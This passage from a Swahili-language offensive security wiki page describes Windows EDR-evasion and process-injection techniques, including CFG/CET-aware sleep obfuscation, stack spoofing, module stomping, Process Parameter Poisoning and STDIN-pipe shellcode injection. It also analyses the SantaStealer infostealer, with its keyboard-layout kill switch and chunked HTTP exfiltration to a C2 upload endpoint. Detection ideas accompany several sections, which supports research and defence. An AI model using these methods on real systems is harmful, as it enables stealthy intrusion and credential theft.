- Sajili kila indirect destination inayotumiwa na mnyororo kwa `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ihusishe **ukubwa mzima wa image**.
- Kwa maeneo yaliyomapishwa kwa mkono/PIC/stomped, tumia **allocation base** na ukubwa wa allocation badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazofikiwa kwa njia isiyo ya moja kwa moja (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sections zozote zinazoweza kutekelezwa zinazodhibitiwa na mshambuliaji ambazo zitakuwa indirect targets.

Hii hubadilisha minyororo ya sleep ya aina ya ROP/JOP kutoka “hufanya kazi tu kwenye michakato isiyo na CFG” kuwa primitive inayoweza kutumiwa tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompiliwa kwa `/guard:cf`.

### Stack spoofing salama kwa CET kwa threads zinazolala

Kubadilisha `CONTEXT` yote kunaonekana wazi na kunaweza kuharibika kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyospoofiwa bado lazima ilingane na hardware shadow stack. Muundo salama zaidi wa kuficha sleep ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine katika mchakato huohuo na usome mipaka ya stack ya `NT_TIB` / TEB yake (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, huku `Rsp`/hali ya stack iliyospoofiwa ikibaki kama ilivyo.
- Wakati wa sleep, nakili `NT_TIB` ya thread iliyospoofiwa kwenye TEB ya sasa ili stack walkers zi-unwind ndani ya range halali ya stack.
- Baada ya wait kukamilika, rejesha TIB na thread context ya awali.

Hii huhifadhi instruction pointer inayolingana na CET huku ikipotosha EDR stack walkers zinazotegemea metadata ya stack ya TEB kuthibitisha unwinds.

### Mbadala unaotegemea APC: Kraken Mask

Ikiwa utumaji wa timer-queue una saini inayotambulika mno, mfuatano huohuo wa kusimba kwa fiche sleep, kuspoof stack na kurejesha unaweza kutekelezwa kutoka kwa helper thread iliyosimamishwa kwa kutumia APCs zilizowekwa kwenye foleni:<sup>[[27]](#references)</sup>

- Tengeneza helper thread yenye `NtTestAlert` kama entrypoint.
- Weka `CONTEXT` frames/APCs zilizotayarishwa kwenye foleni kwa `NtQueueApcThread` na uzitekeleze kwa `NtAlertResumeThread`.
- Hifadhi hali ya mnyororo kwenye heap badala ya stack ya helper ili kuepuka kumaliza stack chaguomsingi ya thread ya KB 64.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara ya start event na kuzuia utekelezaji kwa hatua moja.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza muda wa race ambapo scanner inaweza kunasa stack ambayo haijarejeshwa kikamilifu.

Hii hubadilisha saini ya `CreateTimerQueueTimer` + `NtContinue` na kuweka saini ya helper-thread/APC huku ikidumisha malengo yale yale ya kuficha kwa RC4 na stack spoofing.

Mawazo ya ziada ya Detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits au APC dispatch.
- `GetThreadContext`/`SetThreadContext` zinazotumika kuzunguka `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na maandishi ya moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Minyororo ya `NtQueueApcThread`/`NtAlertResumeThread` inayofikia kwa njia isiyo ya moja kwa moja `SystemFunction032`, `VirtualProtect` au helpers za kurejesha ruhusa za sections.
- Matumizi yanayojirudia ya saini fupi za gadgets kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizosainiwa.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka kwenye **`.text` section ya DLL ambayo tayari imeomapishwa ndani ya target process**, badala ya kutenga memory ya faragha inayoweza kutekelezwa na inayoonekana wazi au kupakia DLL mpya ya kutumika kama mhanga. Lengo la overwrite linapaswa kuwa **image iliyopakiwa kutoka kwenye diski**, ambayo nafasi yake ya code inaweza kubeba payload bila kuharibu njia za code ambazo mchakato bado unahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Uteuzi wa target unaotegemeka

Stomping ya kijuujuu dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si thabiti: huenda DLL haijapakiwa kwenye remote process, na eneo dogo mno la code litasababisha mchakato ku-crash. Mchakato unaotegemeka zaidi ni:

1. Orodhesha modules za target process na uhifadhi **orodha ya majina pekee** ya DLL zilizopakiwa tayari.
2. Jenga payload kwanza na urekodi **ukubwa wake halisi kwa bytes**.
3. Changanua DLL zinazoweza kutumika kwenye diski na ulinganishe **`.text` `Misc_VirtualSize`** ya PE section na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa faili kwa sababu huonyesha ukubwa wa executable section **inapomapishwa kwenye memory**.
4. Changanua **Export Address Table (EAT)** na uchague RVA ya function iliyosafirishwa kama offset ya kuanzia ya stomp.
5. Kokotoa **blast radius**: ikiwa payload inazidi mpaka wa function iliyochaguliwa, itafuta exports zilizo karibu ambazo zimepangwa baada yake kwenye memory.

Helpers za kawaida za recon/uteuzi zinazoonekana kwenye mazingira halisi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Pendelea kutumia DLLs **ambazo tayari zimepakiwa** kwenye remote process ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa image usiotarajiwa.
- Pendelea exports ambazo target application huzitekeleza mara chache; vinginevyo, code paths za kawaida zinaweza kugusa bytes zilizostompiwa kabla au baada ya kuunda thread.
- Implants kubwa mara nyingi huhitaji kubadilisha jinsi shellcode inavyowekwa kwenye source code ya injector, kutoka string literal hadi **byte-array/braced initializer**, ili buffer nzima iwakilishwe kwa usahihi.

Detection ideas
- Uandishi wa remote kwenye kurasa za executable zinazotegemea image (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za export ambazo bytes zake kwenye memory hazilingani tena na faili inayozihifadhi kwenye diski.
- Remote threads au context pivots zinazoanza kutekeleza ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mfuatano unaotia shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` unaolenga kurasa za `.text` za DLL, ukifuatiwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya remote write (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye target inayoendeshwa tayari, hutumia ukweli kwamba Windows **hunakili vigezo fulani vya kuanzisha `CreateProcessW` kwenye child process** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers zinazoweza kutiwa sumu na kunakiliwa na `CreateProcessW`

Carriers muhimu ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya carriers kwa matumizi ya vitendo:

- `lpCommandLine` lazima ielekeze kwenye memory inayoweza kuandikwa kwa `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode**, ikijumuisha null terminator.
- `lpEnvironment` lazima iwe environment block ya Unicode yenye mifuatano mfululizo ya `NAME=VALUE\0` inayomalizika kwa `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hiyo ulinganifu wa `ShellInfo` unapaswa kuchukuliwa kama maelezo ya utekelezaji badala ya mkataba thabiti ulioandikwa rasmi.

Hii hugeuza uundaji wa kawaida wa process kuwa **primitive ya kuhamisha payload**. Operator huunda child process kwa data ya kuanzisha inayodhibitiwa na mshambulizi, kisha huruhusu Windows kufanya nakala kati ya processes.

### Mtiririko wa remote lookup bila remote write APIs

Baada ya child kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma pekee**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma remote `PEB`
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida ni `RW`, si la kutekelezeka. Mlolongo wa kawaida wa P3 ni:

1. Unda process kama kawaida (bila kuisimamisha)
2. Fanya ukurasa wa parameter uliochaguliwa uweze kutekelezeka kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread ambayo tayari imerudishwa kwenye `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, badilisha `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hii **haihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwenye handle ya main thread iliyorudishwa.

Hii huepuka API kadhaa ambazo kwa kawaida hufuatiliwa kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kikomo cha null-byte na shellcode ya hatua kwa hatua

Njia zote tatu za kubeba data ni **string au data inayofanana na string**, kwa hivyo payload ghafi iliyo na `0x00` hukatwa wakati wa uhamishaji. Njia ya vitendo ya kukabiliana na hili ni kutumia **hatua ya kwanza isiyo na null** inayounda upya constants wakati wa utekelezaji kisha kupakia hatua ya pili ya aina yoyote.

Muundo rahisi ni usanisi wa constant kwa kutumia XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu hatua ya kwanza kuunda strings za stack, arguments za API, njia za DLL, au loader ya shellcode ya hatua ya pili bila kujumuisha null bytes kwenye parameter inayosafirishwa.

### Wito wa API unaotegemea stack kutoka hatua ya kwanza

Wakati hatua ya kwanza inapohitaji kuita API kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya target
- kutenga **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` **imepangiliwa kwa 16-byte** kabla ya wito

Kisha hatua ya pili inaweza kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa kutumia `VirtualProtect`, na kurukwa kwenda humo, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya utambuzi

Fursa nzuri za ufuatiliaji zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kubadilisha **kurasa za process-parameter ziwe executable**
- mabadiliko hayo ya protection yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu isivyo kawaida / zenye entropy ya juu wakati wa kuunda process

### Maelezo

- P3 ni **mbinu ya uhamishaji kati ya processes**, si primitive kamili ya utekelezaji yenyewe: parameter iliyonakiliwa bado inahitaji mabadiliko ya ruhusa ya execute na mbinu ya kuelekeza utekelezaji.
- Waandishi walifikiria kutumia `RtlCreateProcessReflection` / Dirty Vanity lakini wakaikataa kwa sababu ndani yake hutumia primitives zinazotia shaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## Console STDIN pipe injection

Process child ya console inayoingiliana pia inaweza kutumiwa kama **primitive ya kuhamisha payload**. Injector huelekeza standard input ya child kwenye pipe na kutuma marker ikifuatiwa na shellcode. Baada ya programu ya console kusoma data hiyo hadi kwenye kumbukumbu yake binafsi, injector hutafuta buffer hiyo, huifanya iwe executable na kuelekeza thread ya child humo. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection badala ya mbinu ya jumla ya kukwepa EDR.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", implementation ya rejea hutumia `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia pipe objects zenye majina ya kipekee ndani ya mfumo, lakini PoC haitumii njia ya `\\.\pipe\<name>` wala haiiti `CreateNamedPipe`. Huunda handles zinazoweza kurithiwa zikiwa na security descriptor chaguomsingi, huweka handle ya kusoma katika `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, na kuanzisha process mpya ya child huku kurithiwa kwa handles kukiwashwa. Kwa hiyo, PoC hii huzindua console executable iliyotolewa; haiunganishi pipe yake kwenye process iliyopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mtiririko wa kazi wa rejea

Implementation hutumia mlolongo ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za child. Zima urithi kwenye handles mbili za upande wa parent na ufunge nakala za upande wa child katika parent baada ya kuunda process.
2. Zindua executable inayoingiliana kama `netsh.exe` au `nslookup.exe` kwa kutumia `CREATE_NEW_CONSOLE`. Child hurithi handles za kawaida zilizoelekezwa upya.
3. Tuma array nzima ya binary ya `rawData` kwa kutumia `WriteFile` kupitia handle ya `STDIN` ya upande wa parent. Programu ya console hutumia bytes hizo na kuacha nakala yake katika mojawapo ya maeneo yake binafsi yaliyotengewa kumbukumbu.
4. Pitia nafasi ya anwani ya child kwa kutumia `VirtualQueryEx`, soma maeneo yanayoweza kuwa `MEM_PRIVATE` kwa kutumia `ReadProcessMemory`, na utafute marker mwanzoni mwa `rawData`.
5. Badilisha buffer iliyogunduliwa iwe `PAGE_EXECUTE_READWRITE` kwa kutumia `VirtualProtectEx`.
6. Tambua thread kuu, isimamishe, weka `RIP` kuwa `found_address + 0x19` kwa kutumia `NtSetContextThread`, kisha iendeleze tena.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni mahususi kwa x64: hurekebisha `CONTEXT.Rip`, na payload iliyopachikwa ni shellcode ya x64. `rawData` huanza na alama ya baiti 25, kwa hiyo baiti zinazotekelezeka huanza kwenye offset ya heksadesimali `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au usasishe alama, search vector, ukubwa wa array na offset ya utekelezaji pamoja. Maoni kwenye source pia yanaorodhesha `0x0A`, `0x0D` na `0x1A` kama herufi zisizoruhusiwa. Workflow hii haibadilishi tokeni au ruhusa za child process.<sup>[[41]](#references)</sup>

Kwa mifumo ya kutengeneza native helpers ndogo na payload, tazama [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Mbinu za SantaStealer za Kukwepa Utambuzi Bila Faili na Kuiba Sifa za Kuingia

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyounganisha AV bypass, anti-analysis na ufikiaji wa sifa za kuingia katika workflow moja.<sup>[[24]](#references)</sup>

### Uchujaji kwa mpangilio wa kibodi na ucheleweshaji wa sandbox

- Alama ya config (`anti_cis`) huhesabu mpangilio wa kibodi uliosakinishwa kupitia `GetKeyboardLayoutList`. Ikiwa itapata mpangilio wa Cyrillic, sample huunda alama tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha haitawahi kujilipua katika maeneo yasiyolengwa huku ikiiacha artifact ya uchunguzi.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya `check_antivm` ya tabaka nyingi

- Variant A hupitia orodha ya michakato, huhesabu hash ya kila jina kwa checksum maalum ya rolling, na kulinganisha matokeo na blocklist zilizopachikwa za debugger/sandbox; hurudia checksum hiyo kwa jina la kompyuta na kukagua saraka za kazi kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kikomo cha chini cha idadi ya michakato, muda wa hivi karibuni tangu kuwasha), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hukagua muda kabla na baada ya kusubiri ili kubaini single-stepping. Ikitambua chochote, husitisha kabla moduli hazijazinduliwa.

### Helper isiyo na faili + upakiaji wa reflective wa hatua mbili kwa ChaCha20

- DLL/EXE kuu hupachika Chromium credential helper ambayo aidha huandikwa kwenye diski au hupakiwa mwenyewe kwenye kumbukumbu; katika hali isiyo na faili, hutatua imports/relocations yenyewe ili kuepuka kuandika faili zozote za helper.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa kwa ChaCha20 mara mbili (funguo mbili za baiti 32 + nonces za baiti 12). Baada ya hatua zote mbili, huipakia blob kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia reflective process hollowing kupitia direct-syscall ili kuingiza msimbo kwenye Chromium browser inayotumika, kurithi funguo za AppBound Encryption, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya uimarishaji wa ABE.

### Ukusanyaji wa moduli kwenye kumbukumbu na uhamishaji wa data kwa HTTP ya vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la function pointers `memory_generators` na kuanzisha thread moja kwa kila moduli iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya kipindi cha kujiunga cha takriban sekunde 45.
- Baada ya kukamilika, kila kitu hubanwa katika faili ya ZIP kwa kutumia maktaba ya `miniz` iliyounganishwa statically, kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive kwa HTTP POST katika vipande vya MB 10 kwenda `http://<C2>:6767/upload`, huku ikiiga mpaka wa `multipart/form-data` wa browser (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, hiari `w: <campaign_tag>`, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa uunganishaji upya umekamilika.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)

{{#include ../banners/hacktricks-training.md}}
